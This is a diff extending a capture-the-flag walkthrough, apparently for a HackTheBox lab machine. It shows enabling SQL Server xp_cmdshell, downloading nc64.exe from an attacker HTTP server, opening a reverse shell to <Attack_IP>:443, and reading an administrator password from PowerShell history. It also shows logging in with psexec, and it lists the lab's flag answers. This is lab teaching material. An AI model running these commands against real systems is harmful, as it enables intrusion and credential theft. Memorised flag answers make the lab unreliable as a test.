@@ -23,7 +23,13 @@ Q6: What script can be used in order to search possible paths to escalate privil
 A6: WinPeas
 
 Q7: What file contains the administrators password?
-A7: 
+A7: ConsoleHost_history.txt
+
+Q8: Submit the User flag
+A8: 3e7b102e78218e935bf3f4951fec21a3
+
+Q9: Submit the Root flag
+A9: b91ccec3305e98240082d4474b848528
 
 
 
@@ -98,15 +104,82 @@ Step1:
      
    using xp_cmdshell "whoami" generates an error telling us xp_cmdshell has been turned off as a security procedure but that a system administrator can enable it by using sp_configure
    
-   So let's give it a shot by entering
-   EXEC sp_configure 'xp_cmdshell', 1;
-   We get a message to run the RECONFIGURE statement to install so just type RECONFIGURE; and press enter
+   So let's give it a shot by entering 4 commands
+    1. EXEC sp_configure 'show advanced options', 1;
+    2. RECONFIGURE;
+    3. EXEC sp_configure 'xp_cmdshell', 1;
+    4. RECONFIGURE;
    If you did it right it'll seem like nothing happened but if we now run our test command it should produce output
    xp_cmdshell "whoami"
    
-   Step6: 
-    From here we need to set up a reverse shell
-   
+  Step6: 
+    From here we need to set up a reverse shell we will do this by uploading a binary to the target machine and execute a cmd.exe process on our listening port
+    the Binary can be found here https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
+    it should be a file labeled nc64.exe in your downloads directory, which you will need to navigate over to.
+    From that directory we will start an HTTP server using python
+    sudo python3 -m http.server 80
+    We will also open a new terminal and set up our listener port using netcat
+    sudo nc -l <Attack_IP> 443
+    
+  Step 7: 
+    We need to actually upload the binary to the target system. to do that we need to find the appropriate folder. So we will start looking in the terminal still logged into the SQL server. We will also be using powershell to navigate around, but it will have to be specified before each command using "powershell -c"
+    So for example to see where we are in the file system enter the following command
+    xp_cmdshell "powershell -c pwd"
+    and we see we are in the system32 directory which the user ARCHETYPE does not have permission to upload files to. So we will need to change the current working directory, we are going  to do this and upload our nc64.exe file with one command
+    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<Attack_IP>/nc64.exe -outfile nc64.exe"
+    Our terminal serving up python should verify that the file was sent
+    Now we need to bind cmd.exe through the nc to our listener port
+    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <Attack_IP> 443"
+    We should now see in our listener terminal that we have access to a reverse shell.
+    
+  Step 8: 
+    Our reverse shell is set up on a windows machine so we will have to use windows commands from this point, but the user flag for this machine is just on the desktop
+    cd ..
+    cd Desktop
+    dir
+    type user.txt
+    3e7b102e78218e935bf3f4951fec21a3
+    
+ Step 9: 
+  now we need to do some privelege escalation
+  We will need to donwload a a program called WinPeas onto our attack machine and then serve it up on our python http sever to be downloaded onto the target machine
+  Win Peas can be found here https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+  
+  Enter the following commands in our Reverse shell from the Downloads directory
+  powershell
+  wget http://<Attack_IP>/winPEASx64.exe -outfile winPEASx64.exe
+  We can see in our terminal hosting the python http server that our binary downloaded on the target machine so we just have to execute it
+  from the Downloads Directory on the target machine simply type .\winPEASx64.exe
+  This will generate a lot of output but the line we are most concerened with is 
+   C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+  which gives us the answer to question 7.
+  
+ Step 10: 
+  We simply need to navigate over to this file and open it to obtain the administrators password
+  cd ..
+  cd \AppData
+  cd \Roaming
+  cd \Microsoft
+  cd \Windows
+  cd \PowerShell
+  cd \PSReadLine\
+  I'm not really sure why I had to move directories individually, but I did. I assume it has something to do with the reverse shell
+  in windows you use the type command to read a file so enter
+  type ConsoleHost_history.txt
+  and we will see "/user:administrator MEGACORP_4dm1n!!" which is our administrators password
+  
+  Step 11: 
+    We need to actually get our root flag but with the password that is pretty simple
+    inside of a terminal on our attack machine navigate Back to our /impacket/build/scripts-3.10 directory 
+    This time we are going to use the psexec.py script to log in to the target machine as administrator
+    to do so enter the following command
+    python3 psexec.py administrator@<Target_IP>
+    when prompted for the password enter MEGACORP_4dm1n!!
+    
+    The flag can be found in the User\Administrator\Desktop directory
+    b91ccec3305e98240082d4474b848528
+
+    
    
    
      
